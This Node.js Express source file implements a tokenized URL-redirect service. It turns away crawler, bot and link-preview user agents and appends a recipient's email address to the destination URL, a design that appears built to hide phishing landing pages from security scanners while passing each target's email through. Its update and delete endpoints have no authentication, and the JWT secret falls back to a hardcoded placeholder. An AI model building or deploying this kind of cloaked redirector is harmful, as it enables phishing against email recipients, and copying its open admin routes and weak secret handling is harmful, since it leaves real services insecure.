require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const JWT_SECRET = process.env.JWT_SECRET || 'your_strong_secret_key';

// Middleware
app.use(express.static('public'));
app.use(express.json());

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
  message: 'Too many requests. Please try again later.',
});
app.use(limiter);

// Helper functions
function generateUniqueKey() {
  return crypto.randomBytes(8).toString('hex');
}

function generateToken(key) {
  return jwt.sign({ key }, JWT_SECRET);
}

// POST /add-redirect
app.post('/add-redirect', async (req, res) => {
  const { destination } = req.body;

  if (!destination || !/^https?:\/\//.test(destination)) {
    return res.status(400).json({ message: 'Invalid destination URL.' });
  }

  const key = generateUniqueKey();
  const token = generateToken(key);

  try {
    await db.addRedirect(key, destination, token);
    const baseUrl = req.protocol + '://' + req.get('host');
    res.json({
      message: 'Redirect added successfully!',
      redirectUrl: `${baseUrl}/${key}?token=${token}`,
      pathRedirectUrl: `${baseUrl}/${key}/${token}`,
    });
  } catch (err) {
    console.error('DB error on addRedirect:', err);
    res.status(500).json({ message: 'Failed to save redirect.' });
  }
});

// GET /:key/:token
app.get('/:key/:token', async (req, res) => {
  const { key, token } = req.params;
  const email = req.query.email || null;
  const userAgent = req.headers['user-agent'] || '';

  if (/bot|crawl|spider|preview/i.test(userAgent)) {
    return res.status(403).send('Access denied.');
  }

  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).send('Invalid email format.');
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const row = await db.getRedirect(key);

    if (!row) {
      return res.status(404).send('Redirect not found.');
    }

    if (row.token !== token) {
      return res.status(403).send('Invalid token.');
    }

    let destination = row.destination;
    if (email) {
      destination = destination.endsWith('/') ? destination + email : `${destination}/${email}`;
    }

    res.redirect(destination);
  } catch (err) {
    console.log('JWT verification or DB error:', err.message);
    res.status(403).send('Invalid or expired token.');
  }
});
// Update redirect
app.put('/api/redirects/:id', async (req, res) => {
  try {
    await db.updateRedirect(req.params.id, req.body.destination);
    res.json({ message: 'Redirect updated' });
  } catch (err) {
    console.error('Update error:', err);
    res.status(500).json({ message: 'Update failed' });
  }
});

// Delete redirect
app.delete('/api/redirects/:id', async (req, res) => {
  try {
    await db.deleteRedirect(req.params.id);
    res.json({ message: 'Redirect deleted' });
  } catch (err) {
    console.error('Delete error:', err);
    res.status(500).json({ message: 'Delete failed' });
  }
});

// 404 fallback
app.use((req, res) => {
  res.status(404).send('Error: Invalid request.');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
